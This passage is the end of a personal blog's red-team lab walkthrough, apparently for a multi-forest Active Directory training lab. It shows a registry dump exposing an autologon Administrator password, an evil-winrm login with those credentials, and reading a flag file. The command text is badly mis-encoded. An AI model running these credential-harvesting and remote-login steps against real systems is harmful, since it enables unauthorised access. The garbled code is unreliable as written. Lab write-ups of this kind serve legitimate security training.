ğ‘œğ‘“ğ‘¡\ğ‘Šğ‘–ğ‘›ğ‘‘ğ‘œğ‘¤ğ‘  ğ‘ğ‘‡\ğ¶ğ‘¢ğ‘Ÿğ‘Ÿğ‘’ğ‘›ğ‘¡ğ‘£ğ‘’ğ‘Ÿğ‘ ğ‘–ğ‘œğ‘›\ğ‘Šğ‘–ğ‘›ğ‘™ğ‘œğ‘”ğ‘œğ‘›<br>ğ´ğ‘¢ğ‘¡ğ‘œğ‘…ğ‘’ğ‘ ğ‘¡ğ‘ğ‘Ÿğ‘¡ğ‘†â„ğ‘’ğ‘™ğ‘™ ğ‘…ğ¸ğº<span class="hljs-literal">_</span>ğ·ğ‘Šğ‘‚ğ‘…ğ· <span class="hljs-number">0</span>ğ‘¥<span class="hljs-number">1</span><br>ğµğ‘ğ‘ğ‘˜ğ‘”ğ‘Ÿğ‘œğ‘¢ğ‘›ğ‘‘ ğ‘…ğ¸ğº<span class="hljs-literal">_</span>ğ‘†ğ‘ <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span><br>ğ¶ğ‘ğ‘â„ğ‘’ğ‘‘ğ¿ğ‘œğ‘”ğ‘œğ‘›ğ‘ ğ¶ğ‘œğ‘¢ğ‘›ğ‘¡ ğ‘…ğ¸ğº<span class="hljs-literal">_</span>ğ‘†ğ‘ <span class="hljs-number">10</span><br>ğ·ğ‘’ğ‘ğ‘¢ğ‘”ğ‘†ğ‘’ğ‘Ÿğ‘£ğ‘’ğ‘Ÿğ¶ğ‘œğ‘šğ‘šğ‘ğ‘›ğ‘‘ ğ‘…ğ¸ğº<span class="hljs-literal">_</span>ğ‘†ğ‘ ğ‘›ğ‘œ<br>ğ·ğ‘’ğ‘“ğ‘ğ‘¢ğ‘™ğ‘¡ğ‘ˆğ‘ ğ‘’ğ‘Ÿğ‘ğ‘ğ‘šğ‘’ ğ‘…ğ¸ğº<span class="hljs-literal">_</span>ğ‘†ğ‘ ğ‘¨ğ’…ğ’ğ’Šğ’ğ’Šğ’”ğ’•ğ’“ğ’‚ğ’•ğ’ğ’“<br>ğ·ğ‘’ğ‘“ğ‘ğ‘¢ğ‘™ğ‘¡ğ·ğ‘œğ‘šğ‘ğ‘–ğ‘›ğ‘ğ‘ğ‘šğ‘’ ğ‘…ğ¸ğº<span class="hljs-literal">_</span>ğ‘†ğ‘ ğ‘Šğ¼ğ‘âˆ’<span class="hljs-number">10</span>âˆ’ğ‘ƒğ‘…ğ‘‚âˆ’ğ‘‹<span class="hljs-number">64</span><br>ğ´ğ‘¢ğ‘¡ğ‘œğ´ğ‘‘ğ‘šğ‘–ğ‘›ğ¿ğ‘œğ‘”ğ‘œğ‘› ğ‘…ğ¸ğº<span class="hljs-literal">_</span>ğ‘†ğ‘ <span class="hljs-number">1</span><br>ğ·ğ‘’ğ‘“ğ‘ğ‘¢ğ‘™ğ‘¡ğ‘ƒğ‘ğ‘ ğ‘ ğ‘¤ğ‘œğ‘Ÿğ‘‘ ğ‘…ğ¸ğº<span class="hljs-literal">_</span>ğ‘†ğ‘ ğ‘»ğ’†ğ’”ğ’•@ğŸğŸğŸ‘<br>&lt;..SNIP..&gt;<br></code></pre></div></td></tr></table></figure>

<p>Reconnect to the â€˜<strong>admin-sysâ€™</strong>Â server with local administrator credentials.</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">./ğ‘’ğ‘£ğ‘–ğ‘™âˆ’ğ‘¤ğ‘–ğ‘›ğ‘Ÿğ‘š.ğ‘Ÿğ‘ âˆ’ğ‘– 127.0.0.1 âˆ’ğ‘¢ ğ´ğ‘‘ğ‘šğ‘–ğ‘›ğ‘–ğ‘ ğ‘¡ğ‘Ÿğ‘ğ‘¡ğ‘œğ‘Ÿ âˆ’ğ‘ ğ‘‡ğ‘’ğ‘ ğ‘¡@123<br>ğ‘¡ğ‘¦ğ‘ğ‘’ ğ¶:<span class="hljs-symbol">\</span>ğ‘ˆğ‘ ğ‘’ğ‘Ÿğ‘ <span class="hljs-symbol">\</span>ğ´ğ‘‘ğ‘šğ‘–ğ‘›ğ‘–ğ‘ ğ‘¡ğ‘Ÿğ‘ğ‘¡ğ‘œğ‘Ÿ<span class="hljs-symbol">\</span>ğ·ğ‘’ğ‘ ğ‘˜ğ‘¡ğ‘œğ‘<span class="hljs-symbol">\</span>ğ‘‡ğ‘Ÿğ‘–ğ‘¢ğ‘šğ‘â„.ğ‘¡ğ‘¥ğ‘¡<br><br>&lt;Result&gt;<br>CONGRATULATIONS, YOU HAVE SUCCESSFULLY COMPROMISED MULTI-FOREST RED TEAM ENVIRONMENT!!<br>&lt;3<br>&lt;/Result&gt;<br></code></pre></div></td></tr></table></figure>

<p>Congratulations!!</p>
<p>The Multi-Forest Red Team Environment is successfully compromised.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image45.png" srcset="/img/loading.gif"></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/killchains/">killchains</a>
                    
                  </div>
                
              </div>
              
                
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/06/22/%E6%94%BB%E5%87%BB%E9%93%BE%E5%85%AD%EF%BC%9A%E5%9F%9F%E6%B8%97%E9%80%8F%E6%A1%88%E4%BE%8B%E4%B8%89/">
                        <span class="hidden-mobile">æ”»å‡»é“¾å…­ï¼šåŸŸæ¸—é€æ¡ˆä¾‹ä¸‰</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


            

                
                  <a id="scroll-top-button" href="#" role="button">
                    <i class="iconfont icon-arrowup" aria-hidden="true"></i>
                  </a>
                  

                    
                      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
                        

                          
      </main>

      <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://whale3070.github.io/" target="_blank" rel="nofollow noopener"><span>Whale3070</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- ä¸è’œå­ç»Ÿè®¡PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            æ€»è®¿é—®é‡ 
            <span id="busuanzi_value_site_pv"></span>
             æ¬¡
          </span>
      
      
        <!-- ä¸è’œå­ç»Ÿè®¡UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            æ€»è®¿å®¢æ•° 
            <span id="busuanzi_value_site_uv"></span>
             äºº
          </span>
      
    
  </div>


  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>






  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>



    </body>

  </html>